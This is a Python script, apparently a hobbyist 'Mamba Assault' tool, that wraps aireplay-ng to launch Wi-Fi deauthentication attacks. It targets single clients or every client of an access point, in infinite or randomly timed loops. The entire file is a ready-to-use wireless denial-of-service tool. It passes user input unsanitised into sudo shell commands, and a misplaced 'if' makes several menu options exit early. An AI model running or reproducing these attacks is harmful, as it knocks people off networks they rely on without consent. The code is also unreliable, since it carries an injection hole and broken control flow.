import os 
import sys
import time
import random
import re

Menu="""


        8ftLLfCCGGG08                                                                               
        t1L08ftffLti;;fLL0                                                                          
        Ltt;1tCGGCGL;:1ftffC0                          888888                                       
         Gf;.,,:tC0CGGfL0GLLttfLG8              80CCLLLfftffffffLCG08                               
           8C1i:.::iLL000008GC0LffL0          0LffLLCCGCLCCLCCCLLLffffLG8                           
             80Lt;:,,:i11fffGCCG0CL1G       0ttCGCCGCCCLLLLCLLCLLLCLCLLffL8                         
                8GLti,   .  ,11fCfG,i      GiLGCCLLLLCLfLLCCCCLLLLLLLCCGCf1L                        
                    G..   .1LG0LLLL1:10   GiCCLCCCLf111t1t1tLCCLLLLLLLCCLCGt10                      
                   8t,:,,1G80CLffLfLCf1f80:LGLLLCL1tLCLCCCftiifCCLLLLLLLLfLCf;0                     
               8CLt,.:;tGCCCffLLLLLLCGCft:,CLLLLLiLGGCLtifLCCf:iCLLLLLfLLLLLCf;                     
            8Lfi;iiffCGGGLLLLCLLLLCCCLCCLL11fCfLt1GLCCC,G     8CtLLLCLLCLLCLLC;L                    
            0tCLLCLLLLLftt1f1itLfCLLLCLLCLCf11fCf1GCCCL;         fLLLLCLCLLLLLt1                    
              8008888    8 80GLtfLLLCCCCLCLCCfitL1GCCCGiG        0tCCCLLLCCLCCL1                    
                               0tfLffLCLCCCLLCCi1iCCCCGf;        8fLLCLLCCCLCGC1                    
                                 f1LLffCCCLLCLLC;,fGCCCGif       LfCLCCCCCCCCGf1                    
                                  G1tGLtfLLLLLLC1:1GCCCCC;C     CtfLLLLLLLLCCGiC                    
                                    L1GL1LCCCCLC:f1fCCCCCC;G 8CffLLLLLLLLLLLGtt                     
                                   8tLLGftCCLLCtiCfiGCCCCCC;1ffLLLLLfLLLLLLLt1                      
                                  8tLLCGf1CLfCL:LLC1LGCCCCGL;CCLCLLLLLLLLCL1t                       
                                 GtLCCCG11CLLL,,ffLL1GCCCCCGfiCLLCLLLLCCLfiL                        
                                L1CCCCCL,:i::   :fLLiLCCCCCCGtfCLLLLLCLftL8                         
                               t1Lf1i;:::;i1tfLf,;fLfiCCLLCGGGiLCCCLt1fG                            
                            0Gi,1i11tfLLCCGCCCCCL,fLL1LLCCCCC0f;t1tfC8  8000088                     
                        0CfttfLCLLCCCCLLLCLLCCLLC;1LL1fCLLCCCLL.iG00GLtttttt11tfLLG8                
                     0L11ttLLCCLLLLLLCLLLLCLLLCLCitfL1fCCLLLLCC,fLtttfffLCLCLLLLffttf0              
                   Gti1LCCCLfLCLCLLLLLCLCLLLLfft1,fLCiLGGCLCGL1;tfLLfLLLfffLLLfLLCLLfif             
                 G1itCCCLLCLLLCLLCCCCLLftt1i1fLL:;LCt;CCCCGG1itLLLLffLftt1t1ttttffffCCii            
                1:tCCLLLLLLLLLCCGLt1t11;:tft1fLffLCLiLLLCGf;tLLLffffti11ttfffffftiffffC:t           
              G,;CCCCCCCCLLLCCLi;;1fLCCGf1ttLfffft1tLCLLC1;tLLLLfLti1fCG08880CLftfitLfLL,G          
             G 1GLLLLCCCCCCLt;.1fCGGCCGCGGCLffttfLLCGCCLi;LLLfffL1iL8          8L1L1tLLC1i          
            8.iCLLLLLLLLLLf11t:tGGGCCGCGCGG0CGCCGGGLGCG1:LLLffffi18              C1C1LLLC,0         
            L LLLLLLLLLCft1f   LtLC0GGGGGGGCCGCCCCGCCGf,LLLLfLLit                 1L1fLLC;L         
            i;CLLLLCLLLft1f     8CLfLGGG0G0GGGCGC0CCff,fLLfLLLti8                 iLifffC;G         
            :1CLLLLLLLL1fi         0GCfLffCfLLLLfLfLL;;CfLLLLLit        8        CtftLLff;          
            ,tCCLLLLLLftt1             800GGG00888   itCLLLLLL:C  0LfftttfffLG8 0tftLLLCiC          
            ,fCLLLLLLCfff1                           :fLLLfLLC;1C11tfLLLCLLfft1iitfLLLL1C           
            :tCCLLLLLCL1C;C                         8:fLLLLCftiitfLLLLLfLffLCC1;tfLLCftG            
            t;GCCLLLCLC1fL;t0                        ;fLLLft1fLCLfffLLLLLLLLt11LLLLL1f8             
            8:LLCLCLCLLL1LCtitC8                     iifi1tfCCLLLftfffttff1i1fLLLft,C               
             L:CLLLLCLfLftfLCLt1tLG8             80C1,;tffLLLLLfLLfi;;:.:itLLLft1tL;8               
              t;CCLLLLLLLLLffLGCLfftffffffffLft11ii1tLCCCLLfLLLLL1;1LLfLLLCfftttfLL18               
               f:fCLLLLLLLCLLfffLLCLLLLLLffffftfffLCCCCLLLLLLLL1i;,itffLL1,iffffLLft                
                GiifCCLLLLCLLLLLLLLftfttftffLLLLLLLLLLLCLCCCf11tLCLt1iiii;1CLffLLL1G                
                  C1;1fLCCLLCLLLCLLLLLLLffLfLLLLLLLLLCLLLti:itLCLLLCLLLLLLLLfLLLLiC                 
                    0f1i1tffCCCLLLLLCLLCffLLLLLCLCLLfttft,,:ifLLCCCCCLLLCLLLLCfttG                  
                       8GLt111fffLLLLLLfLfffffftttffLG0LtfLCfi:1ttfLffLLffffftfG                    
                            8GCLffffffffffLCCGG088   GttLLCttC8 80CLffttffLCG8                      
                                                   8ftLLCL1C                                        
                                                   LtCLLC11                                         
                                                   LiCLfLLtfLCG0G000888                             
                                                    tifLCCCLffftfftfffffffLG0                       
                                                     C1111ttffffLftffffffttftfC8                    
                                                       0CLffttfftfffLLLffttttfttf8                  
                                                                          8Cfiff118                 
                                                                             L;ff;C                 
                                                                           80t1fti0                 
                                                                      80GCLftfft;G                  
                                                                8GCLfftt1tttttfC8                   
                                                          88GCftiiiiii1ttfLC08                      
                                                  80GCft11i;;i1i1ffLCG08                            
                                              Ctii;i;i11ttLCG08                                     
                                               888088                                               
                                                                                                    



@@@@@@@@@@    @@@@@@   @@@@@@@@@@   @@@@@@@    @@@@@@       @@@@@@    @@@@@@    @@@@@@    @@@@@@   @@@  @@@  @@@       @@@@@@@  
@@@@@@@@@@@  @@@@@@@@  @@@@@@@@@@@  @@@@@@@@  @@@@@@@@     @@@@@@@@  @@@@@@@   @@@@@@@   @@@@@@@@  @@@  @@@  @@@       @@@@@@@  
@@! @@! @@!  @@!  @@@  @@! @@! @@!  @@!  @@@  @@!  @@@     @@!  @@@  !@@       !@@       @@!  @@@  @@!  @@@  @@!         @@!    
!@! !@! !@!  !@!  @!@  !@! !@! !@!  !@   @!@  !@!  @!@     !@!  @!@  !@!       !@!       !@!  @!@  !@!  @!@  !@!         !@!    
@!! !!@ @!@  @!@!@!@!  @!! !!@ @!@  @!@!@!@   @!@!@!@!     @!@!@!@!  !!@@!!    !!@@!!    @!@!@!@!  @!@  !@!  @!!         @!!    
!@!   ! !@!  !!!@!!!!  !@!   ! !@!  !!!@!!!!  !!!@!!!!     !!!@!!!!   !!@!!!    !!@!!!   !!!@!!!!  !@!  !!!  !!!         !!!    
!!:     !!:  !!:  !!!  !!:     !!:  !!:  !!!  !!:  !!!     !!:  !!!       !:!       !:!  !!:  !!!  !!:  !!!  !!:         !!:    
:!:     :!:  :!:  !:!  :!:     :!:  :!:  !:!  :!:  !:!     :!:  !:!      !:!       !:!   :!:  !:!  :!:  !:!   :!:        :!:    
:::     ::   ::   :::  :::     ::    :: ::::  ::   :::     ::   :::  :::: ::   :::: ::   ::   :::  ::::: ::   :: ::::     ::    
 :      :     :   : :   :      :    :: : ::    :   : :      :   : :  :: : :    :: : :     :   : :   : :  :   : :: : :     :     
                                                                                                                                
 

Generated at: ascii.co.uk
______________________________

WATCH OUT! THE MAMBA IS COMMING! 


0-Deauth attack against 1 client - Infinite Attacks.
1-Deauth attack against 1 client - Infinite loop. 100 attacks loop with random timer. Infinite loop
2-Deauth attack against 1 client - Specified number of attacks.
3-Deauth attack against all clients in a AP - Infinite Attack
4-Deauth attack against all clients in a AP - Infinite loop. 100 attacks loop with random timer.
5-Deauth attack against all clients in a AP - Specified number of attacks.
6-Deauth attack against a client with unknown ESSID - Infinite Attack
7-Exit

"""

def extracting_scanned_data():

    monitor_file = open("monitor.txt","r")
    file_date = monitor_file.readlines()
    monitor_file.close()
    scanned_network_data=""

    for i in file_date:

        if re.search("bssid=",i) : 
            scanned_network_data=i


    if re.search("essid=",scanned_network_data):
        final_data= scanned_network_data.split("/")
        bssid_info=final_data[0]
        #print(bssid_info)
        bssid=bssid_info.split("=")
        bssid=bssid[1]
        essid_info=final_data[1]
        essid=essid_info.split("=")
        essid=essid[1]
        #print(f"BSSID: {bssid}, ESSID: {essid}")
        return bssid,essid
    else:
        final_data= scanned_network_data.split("/")
        bssid=final_data[0]
        bssid=bssid.split("=")
        bssid=bssid[1]
        essid="Unknown"
        #print(f"BSSID: {bssid}, ESSID: {essid}")
        return bssid,essid

def extracting_mon():
    monitor_file = open("monitor.txt","r")
    file_data = monitor_file.readlines()
    monitor_file.close()
    scanned_network_data=""

    for i in file_data:

        if re.search("mon",i) : 
            scanned_network_data=i
            
    final_data= scanned_network_data.split("\t")
    #print(final_data)
    monitor_interface=final_data[1]
    print(f"Monitor Interface: {monitor_interface}")
    return monitor_interface


print("\n")

print(Menu)

print("\n")

continuity=True

while continuity:

    selection = input("Select an option: ")

    if selection=="0":

        interface=extracting_mon()
        (bssid,essid)= extracting_scanned_data()
        client=input("Select client: ")

        bssid=bssid.replace("\n","") # Cleaning string from new line characters, "\n"
        essid=essid.replace("\n","") # Cleaning string from new line characters, "\n"

        try:

            os.system(f"sudo aireplay-ng -0 0 -a {bssid} -c {client} -e {essid} {interface} ")

        except KeyboardInterrupt:

            continue


    elif selection=="1":

        interface=extracting_mon()


        bssid,essid = extracting_scanned_data()

        bssid=bssid.replace("\n","") # Cleaning string from new line characters, "\n"
        essid=essid.replace("\n","") # Cleaning string from new line characters, "\n"

        client=input("Select client: ")


        while True:

            num=random.randint(1,20)
            interval=5
            reaction_at=interval*num

            delay=time.sleep(reaction_at)

            try:

                os.system(f"sudo aireplay-ng -0 300 -a {bssid} -c {client} -e {essid} {interface}")

            except KeyboardInterrupt:
                break
        
        continue

    elif selection =="2":

        interface=extracting_mon()



        bssid,essid = extracting_scanned_data()

        bssid=bssid.replace("\n","") # Cleaning string from new line characters, "\n"
        essid=essid.replace("\n","") # Cleaning string from new line characters, "\n"

        client=input("Select client: ")
        n_times=input("Number of mamba's attacks: ")

        try:

            os.system(f"sudo aireplay-ng -0 {n_times} -a {bssid} -c {client} -e {essid} {interface}")

        except KeyboardInterrupt:

            continue



    if selection=="3":

        interface=extracting_mon()

        bssid,essid = extracting_scanned_data()

        bssid=bssid.replace("\n","") # Cleaning string from new line characters, "\n"
        essid=essid.replace("\n","") # Cleaning string from new line characters, "\n"

        try:

            os.system(f"sudo aireplay-ng -0 0 -a {bssid} -e {essid} {interface}")

        except KeyboardInterrupt:

            continue




    elif selection=="4":

        interface=extracting_mon()
        bssid,essid = extracting_scanned_data()

        bssid=bssid.replace("\n","") # Cleaning string from new line characters, "\n"
        essid=essid.replace("\n","") # Cleaning string from new line characters, "\n"

        num=random.randint(1,20)
        interval=5
        reaction_at=interval*num


        while True:

            num=random.randint(1,20)
            interval=5
            reaction_at=interval*num

            delay=time.sleep(reaction_at)

            try:

                os.system(f"sudo aireplay-ng -0 300 -a {bssid} -e {essid} {interface}")

            except KeyboardInterrupt:

                break

        continue
        
        
    
    elif selection =="5":

        interface=extracting_mon()
        bssid,essid = extracting_scanned_data()

        bssid=bssid.replace("\n","") # Cleaning string from new line characters, "\n"
        essid=essid.replace("\n","") # Cleaning string from new line characters, "\n"

        n_times=input("Number of mamba's attacks: ")

        try:

            os.system(f"sudo aireplay-ng -0 {n_times} -a {bssid} -e {essid} {interface}")
        
        except KeyboardInterrupt:
            continue


    elif selection =="6":

        interface=extracting_mon()
        bssid,essid = extracting_scanned_data()

        bssid=bssid.replace("\n","") # Cleaning string from new line characters, "\n"
        essid=essid.replace("\n","") # Cleaning string from new line characters, "\n"

        client=input("Select client: ")

        try:

            os.system(f"sudo aireplay-ng -0 0 -a {bssid} -c {client} {interface}")

        except KeyboardInterrupt:

            continue


    else:
        print("Bye Bye!")
        break


